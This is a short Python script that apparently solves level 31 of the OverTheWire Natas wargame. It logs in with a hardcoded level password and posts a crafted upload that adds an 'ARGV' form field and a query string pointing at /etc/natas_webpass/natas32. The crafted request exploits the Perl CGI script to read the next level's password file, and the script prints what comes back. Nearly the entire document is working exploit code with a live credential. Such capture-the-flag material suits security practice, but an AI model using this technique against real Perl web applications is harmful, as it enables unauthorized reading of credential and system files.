import requests
import re

base_url = "http://natas31.natas.labs.overthewire.org/index.pl"

s = requests.session()

username = "natas31"
password = "AMZF14yknOn9Uc57uKB02jnYuhplYka3"

s = requests.session()
res1 = s.get(base_url, auth=(username, password))

file = open("file.csv", "w")
file.write("1,2,3,4")
file.close()

res =  s.post(base_url + "?/etc/natas_webpass/natas32", 
              data={'file': 'ARGV'},
             files={'file': open("file.csv", "rb")},
             auth=(username, password))

body = re.findall("<th>(.*)</th>", res.text, flags=re.DOTALL)[0]

print("="*80)
print(body)
# print(res.text.split("</style>")[-1])
print("="*80)
